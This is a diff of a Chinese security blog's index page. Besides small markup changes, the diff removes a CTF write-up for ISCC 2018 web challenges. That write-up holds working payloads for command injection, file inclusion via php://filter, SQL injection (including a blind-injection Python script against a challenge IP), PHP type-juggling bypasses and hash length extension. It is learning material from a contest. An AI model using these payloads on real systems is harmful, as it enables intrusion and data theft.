@@ -538,11 +632,11 @@
 
 
   
-    <article id="post-xss挑战赛的Payload(上)" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss挑战赛的Payload(上)" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/07/10/xss挑战赛的Payload(上)/" class="article-date">
   <time class="post-time" datetime="2018-07-10T11:02:27.000Z" itemprop="datePublished">
-    <span class="post-month">7月</span><br/>
+    <span class="post-month">7月</span><br>
     <span class="post-day">10</span>
   </time>
 </a>
@@ -594,7 +688,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjn3ccgg2000pbkve6t0zy3hy" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjnbrwl7s000tcwvejk6z7x31" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -608,11 +702,11 @@
 
 
   
-    <article id="post-关于xss的一些学习心得" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-关于xss的一些学习心得" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/06/01/关于xss的一些学习心得/" class="article-date">
   <time class="post-time" datetime="2018-06-01T10:26:17.000Z" itemprop="datePublished">
-    <span class="post-month">6月</span><br/>
+    <span class="post-month">6月</span><br>
     <span class="post-day">01</span>
   </time>
 </a>
@@ -655,95 +749,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjn3ccghq001mbkvelj2ypd6n" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjnbrwl8i0019cwveq8p7kpah" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-ISCC之Web的一些wp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/25/ISCC之Web的一些wp/" class="article-date">
-  <time class="post-time" datetime="2018-05-25T02:36:47.000Z" itemprop="datePublished">
-    <span class="post-month">5月</span><br/>
-    <span class="post-day">25</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/25/ISCC之Web的一些wp/">ISCCC Web的一些wp</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这是我第一次写wp，因为这次比赛挺简单的，我做的题目挺多的所以才写的这篇wp，像之前的那些偶尔爆零的比赛写出来丢人(这次写出来也挺丢人的)，web400之后总结再写，web300的注入真心不会。。</p>
-<h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>发现有个输入框，f12查看源码发现要求输入的数字大于某个数，然而输入框限制了输入的长度，把maxlength改为999然后乱按一通就过了。  </p>
-<h3 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&apos;2.php&apos;); </span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &apos;Invalid password&apos;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这题考察的是对strcmp()函数的理解，strcmp函数在对数组类的变量是会返回0的，在与其他变量比较时直接返回0，成功得到flag    </p>
-<h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>打开网址发现了第一关的提示。<br><img src="/images/10/7.png" alt=""><br>从xxxx进入的意思大致是构造<strong>Referer:<a href="http://edu.xss.tv" target="_blank" rel="noopener">http://edu.xss.tv</a></strong>，ip构造为题目所要的就能进入第二关了。<br>发现页面跳转到了<strong>number2.php?token=260ca9dd8a4577fc00b7bd5810298076</strong>，第二关要求我们输入密码，提示了密码在哪，所以打开F12找密码。<br><img src="/images/10/8.png" alt=""><br>意外发现了password.js，那一串疑似base64的编码加上==号解码试试，果不其然就是密码了，把密码输进去flag到手。</p>
-<h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>抓包，添加X-Forwarded-For：127.0.0.1，即可得到flag</p>
-<h3 id="你能跨过去吗"><a href="#你能跨过去吗" class="headerlink" title="你能跨过去吗"></a>你能跨过去吗</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</span><br></pre></td></tr></table></figure>
-<p>题目给了一个这个url，还有xss的提示，在url发现callback参数有问题，url解码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-</span><br></pre></td></tr></table></figure></p>
-<p>+/v+是utf-7编码格式，后面的base64得到<strong>&lt;�script&gt;alert(“key:/%nsfocusXSStest%/“)&lt;�/script&gt;</strong><br>把key输入文本框就能得到flag了  </p>
-<h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>这道题目一开始还没做出来，后面捋捋思路发现还是挺有趣的，一道关于变量覆盖的题目。<br>首先找找有没有源码泄露，发现有个index.php.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">	die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>flag在$flag里面，然后要我们通过post传参使得输入的flag等于$flag里面的内容，但是我们并不知道flag是啥，仔细观察发现有<strong>$$</strong>一个东西，我们可以考虑变量覆盖来做。<br>进一步观察发现$_200这个变量是一定会输出的，而且里面的内容并不重要，而$flag在传参的时候会被覆盖，所以我们可以考虑把$flag的内容给$_200，而$flag我们可以通过post<strong>flag=flag</strong>构造来满足题目所要的<strong>$_POST[“flag”] !== $flag</strong><br>所以最终的构造为<img src="/images/10/1.png" alt="">  </p>
-<h3 id="你能绕够吗"><a href="#你能绕够吗" class="headerlink" title="你能绕够吗"></a>你能绕够吗</h3><p>这道题目考察的是文件包含，进题目后随便点点发现了这个<br><img src="/images/10/2.png" alt=""><br>我们可以尝试一下<strong>?f=php://filter/read=convert.base64-encode/resource=index.php</strong><img src="/images/10/3.png" alt="">发现弹出一个error。很有可能把某个关键词给过滤了，试了试发现是php被过滤了，那尝试用大小写来绕过发现没有问题，但是并没有回显<img src="/images/10/4.png" alt="">我们一直index.php是存在的，其他的关键词也没被过滤，<strong>php</strong>这个关键词我们也用大小写绕过了，但是为什么还是读不出结果呢？这只剩下一种可能，由于在之前过滤了php，那很有可能后面又加上了php这个后缀，所以导致我们读不出，抱着希望尝试一下<strong>?f=Php://filter/read=convert.base64-encode/resource=index</strong>，结果出现了回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8dGl0bGU+5a+86Iiq6aG1PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPC9oZWFkPgo8Ym9keT4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTEnPklEOiAxPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTInPklEOiAyPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTMnPklEOiAzPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTQnPklEOiA0PC9ocmVmPgogICAgPC9icj4KPC9ib2R5Pgo8L2h0bWw+Cgo8P3BocAogICAgI0lTQ0N7TEZJT09PT09PT09PT09PT099CiAgICBpZihpc3NldCgkX0dFVFsnZiddKSl7CiAgICAgICAgaWYoc3RycG9zKCRfR0VUWydmJ10sInBocCIpICE9PSBGYWxzZSl7CiAgICAgICAgICAgIGRpZSgiZXJyb3IuLi4iKTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgaW5jbHVkZSgkX0dFVFsnZiddIC4gJy5waHAnKTsKICAgICAgICB9CiAgICB9CiAgICAKPz4KCg==</span><br></pre></td></tr></table></figure></p>
-<p>base64解码后，发现flag  </p>
-<h3 id="Web02"><a href="#Web02" class="headerlink" title="Web02"></a>Web02</h3><p>尝试XFF无果，再试着其他几个伪造ip。成功拿到flag<br>记录一下除了XFF可以伪造ip的HTTP头<br>Client-IP<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr  </p>
-<h3 id="请ping我的ip-看你能Ping通吗"><a href="#请ping我的ip-看你能Ping通吗" class="headerlink" title="请ping我的ip 看你能Ping通吗"></a>请ping我的ip 看你能Ping通吗</h3><p>这道题目我用扫描器扫了一下，发现有个flag.txt，直接读取flag。后面请教大手子-郁离歌师傅，才知道这里有另一种解法。<br>输入<strong>?ip=127.0.0.1%0a%20ls</strong>可以读取目录，然后再目录下发现flag.txt，<strong>ip=127.0.0.1%0a%20cat%20flag.txt</strong>读取flag.txt  </p>
-<h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password"></a>Please give me username and password</h3><p>这种题目不给提示，那就试试源码泄露，发现index.php.txt存在，读取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">	print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">	if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else </span><br><span class="line">			print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else</span><br><span class="line">		print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;else</span><br><span class="line">	print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">	print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>得到需要满足两个条件。第一，<strong>0 == strcasecmp($flag,$_GET[‘username’]</strong>这里我们可以通过数组来绕过，第二点，password长度小于4，但是他又要大于999，这里我们可以考虑用科学记数法，password=1e9就能大于999。所以最终payload为</p>
-<blockquote>
-<p>?username[]=1&amp;password=1e9     </p>
-</blockquote>
-<h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; </span><br><span class="line">    $username = $_POST[&apos;username&apos;]; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $username=&quot;hello&quot;; </span><br><span class="line">    $password=&quot;hello&quot;; </span><br><span class="line">&#125; </span><br><span class="line">if(md5($password) == 0)&#123; </span><br><span class="line">    echo &quot;xxxxx&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>让我们输入username和password，要求只有一个，就是让我们密码的md5为0，构造0e开头的MD5就够了。<br>接着跳到了一个页面叫我们点击，那就按照他的意思点击吧。<br>接下来发现又是一段源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NULL &lt;?php </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line">$a = @$_REQUEST[&apos;a&apos;]; </span><br><span class="line">@eval(&quot;var_dump($$a);&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>直接构造a=GLOBALS就行了，这是某春秋上的原题了。</p>
-<h3 id="sql注入的艺术"><a href="#sql注入的艺术" class="headerlink" title="sql注入的艺术"></a>sql注入的艺术</h3><p>首先测试了一下’和”是否有用，发现被过滤了，接着试了试<strong>%df%27</strong>发现原来这是宽字节注入，其他的啥也没过滤，按着流程走就行了  </p>
-<h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>观察url发现这又是一道文件包含的题目，瞎操作了一个晚上还是读取不出东西，之后只好求助郁离歌大手子，他丢了两个源码给我让我做代码审计，我自己搭环境测试了好久最终才做出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;display_errors&apos;,&apos;Off&apos;);</span><br><span class="line"></span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">$img = $_GET[&apos;img&apos;];</span><br><span class="line">if(isset($img) &amp;&amp; !empty($img))</span><br><span class="line">&#123;</span><br><span class="line">    if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp; preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&apos;File not found.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        preg_match(&apos;/^php:\/\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches);</span><br><span class="line">        if(isset($matches[1]))</span><br><span class="line">        &#123;</span><br><span class="line">            $img = $matches[1];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        header(&apos;Content-Type: image/jpeg&apos;);</span><br><span class="line">        $data = get_contents($img);</span><br><span class="line">        echo $data;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;File not found.&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;img src=&quot;1.jpg&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>以及<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function get_contents($img)</span><br><span class="line">&#123;</span><br><span class="line">	if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">	&#123;</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		header(&apos;Content-Type: text/html&apos;);</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>config.php就是读取文件，关键是如何绕过show.php把我们所需要的文件传进去，它要求我们的参数里面必须包含img但是我们一旦有img那读取的一定是图片格式，所以，我们需要把img给弄掉，把我们的show.php的字符传进去。</p>
-<blockquote>
-<p>preg_match(‘/^php:\/\/filter.<em>resource=([^|]</em>)/i’,trim($img),$matches)   </p>
-</blockquote>
-<p> 这是把我们resource之后的字符传进去的代码，由于对正则不太熟悉，所以我在本地试了试这行代码的作用，在这个正则表达式中，读取的字符串只是最后一个resource=之后的(感兴趣自己去学习一个正则)，所以我们可以构造多个resource来读取我们所要的字符串，payload为<strong>?img=php://filter/resource=10.jpg/resource=show.php</strong>我们就能读取我们所要的文件了，flag在哪完全是靠直觉，读取flag的操作为<strong>?img=php://filter/resource=10.jpg/resource=../flag.php</strong></p>
-<h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p>讲真，很讨厌这种注入题，也没什么提示，首先还是按照一些万能密码试试，在试到<strong>admin’#</strong>发现成功登入了，这就说明<strong>‘</strong>和<strong>#</strong>没有被过滤，然后试了试<strong>admin’ and 1=1#</strong>和<strong>admin’ and 1=2#</strong>，发现回显不同，布尔型注入没跑了，首先是爆出password，然后登入有个提示flag在kjafuibafuohnuvwnruniguankacbh里面，所以爆破这个字段发现flag，这是最后爆破的脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">databaselength = 13</span><br><span class="line">databasename = &quot;sqli_database&quot;</span><br><span class="line">url = &quot;http://118.190.152.202:8011/&quot;</span><br><span class="line">tablenumber = 2</span><br><span class="line">tablelength = 4</span><br><span class="line">tablename1 = &quot;news&quot;</span><br><span class="line">columnnumber = 6</span><br><span class="line">columnnames = &quot;title note kjafuibafuohnuvwnruniguankacbh id date text&quot;</span><br><span class="line">tablename2 = &quot;user&quot;</span><br><span class="line">columnnumber2 = 45</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    r = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select length(kjafuibafuohnuvwnruniguankacbh) from news)=%d)#&quot;%(i),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">    if &quot;normal user&quot; in r.content:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(20,123):</span><br><span class="line">        r1 = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select ascii(substr(kjafuibafuohnuvwnruniguankacbh,%d,1)) from news)=%d)#&quot;%(i,j),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">        if &quot;normal user&quot; in r1.content:</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
-<h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><p>直接给了源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure></p>
-<p>如果我们的md5(key.username)不等于我们传过去的verify那么网页会自己生成一个verify=md5(key.guest)，以及length为key的长度。那这样我们知道了以下几点：<br>key的长度，key+guest的md5以及username要有admin。<br>已知的条件是不是很熟悉呢？再梳理一遍。<br>salt为51位，salt的MD5已知，拓展字符位admin。<br>没错这就是Hash长度拓展攻击。那么先把username=name这个post过去，然后抓包，使用脚本来拓展，然后传参。<br><img src="/images/10/5.png" alt=""><br><img src="/images/10/6.png" alt=""></p>
-<h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>见之前的一篇文章。  </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjn3ccgfo000nbkvee0y4yutq" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
 
     </footer>
   </div>
@@ -798,7 +807,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>25</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
@@ -846,7 +855,7 @@
 
   
 </aside>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
         
       </div>
       <footer id="footer">
